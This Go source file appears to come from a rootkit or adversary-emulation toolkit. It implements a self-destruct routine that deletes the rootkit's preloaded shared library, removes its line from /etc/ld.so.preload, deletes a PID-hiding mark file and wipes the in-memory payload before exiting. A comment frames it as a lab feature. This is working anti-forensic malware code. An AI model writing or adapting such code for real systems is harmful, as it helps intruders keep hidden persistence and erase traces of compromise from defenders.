package ttp

import (
	"bufio"
	"os"
	"strings"
)

// SelfDestruct removes all rootkit artifacts and exits cleanly.
// TTP 222   operator-controlled shutdown for lab sessions.
func SelfDestruct() {
	soPath := rootkitSOPath()

	// 1. Remove .so from disk
	_ = os.Remove(soPath)

	// 2. Remove our entry from /etc/ld.so.preload
	_ = removeFromPreload(soPath)

	// 3. Remove PID mark file
	_ = os.Remove(HideMarkPath)

	// 4. Zero-fill sensitive memory regions before exit
	zeroSensitive()

	// 5. Exit   no deferred cleanup, no panic recovery
	os.Exit(0)
}

func removeFromPreload(soPath string) error {
	data, err := os.ReadFile(PreloadPath)
	if err != nil {
		return err
	}

	var kept []string
	scanner := bufio.NewScanner(strings.NewReader(string(data)))
	for scanner.Scan() {
		line := scanner.Text()
		if strings.TrimSpace(line) != soPath {
			kept = append(kept, line)
		}
	}

	content := strings.Join(kept, "\n")
	if content != "" && !strings.HasSuffix(content, "\n") {
		content += "\n"
	}

	// If preload is now empty, remove the file entirely
	if strings.TrimSpace(content) == "" {
		return os.Remove(PreloadPath)
	}

	return os.WriteFile(PreloadPath, []byte(content), 0644)
}

// zeroSensitive wipes the in-memory rootkit payload before exit.
func zeroSensitive() {
	for i := range RootkitSO {
		RootkitSO[i] = 0
	}
}
